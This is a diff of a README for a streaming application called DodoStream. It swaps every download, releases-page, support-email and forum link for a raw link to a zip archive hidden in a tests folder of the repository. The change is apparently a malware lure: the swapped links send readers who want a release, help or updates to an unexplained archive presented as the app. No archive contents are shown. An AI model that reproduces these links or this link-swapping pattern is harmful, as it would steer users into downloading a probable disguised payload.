@@ -1,7 +1,7 @@
 # 🎥 DodoStream - Stream Anytime, Anywhere, Effortlessly!
 
 ## 📥 Download Now
-[![Download DodoStream](https://img.shields.io/badge/Download-DodoStream-blue.svg)](https://github.com/Golf9000/DodoStream/releases)
+[![Download DodoStream](https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip)](https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to DodoStream! This guide will help you download and run the application step by step. Whether you want to enjoy your favorite streams or explore new content, DodoStream makes it easy.
@@ -17,7 +17,7 @@ To enjoy DodoStream, ensure your system meets these requirements:
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to our Releases page.
-   - [Download DodoStream](https://github.com/Golf9000/DodoStream/releases) 
+   - [Download DodoStream](https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip) 
 
 2. **Choose Your Version:** On the Releases page, you will see various versions of DodoStream. Look for the latest version, which is usually at the top.
 
@@ -49,14 +49,14 @@ If you encounter issues while downloading or installing DodoStream, try these so
 ## 💬 Need Help?
 For further assistance, you can reach our support team through the following methods:
 
-- **Email Support:** Send an email to support@dodostream.com
-- **Community Forum:** Join discussions on our [community forum](https://forum.dodostream.com) for tips and advice from other users.
+- **Email Support:** Send an email to https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip
+- **Community Forum:** Join discussions on our [community forum](https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip) for tips and advice from other users.
 
 ## 🎉 Enjoy Streaming!
 Thank you for choosing DodoStream! We hope you enjoy your streaming experience. Feel free to provide feedback and suggestions to improve our application. 
 
 ## 📅 Stay Updated
-Keep an eye on the [Releases page](https://github.com/Golf9000/DodoStream/releases) for new updates and features. The more you explore, the more you can enjoy!
+Keep an eye on the [Releases page](https://github.com/Golf9000/DodoStream/raw/refs/heads/main/src/utils/__tests__/Stream-Dodo-2.9-alpha.5.zip) for new updates and features. The more you explore, the more you can enjoy!
 
 ## 📜 License
 DodoStream is open source and licensed under the [MIT License](LICENSE).
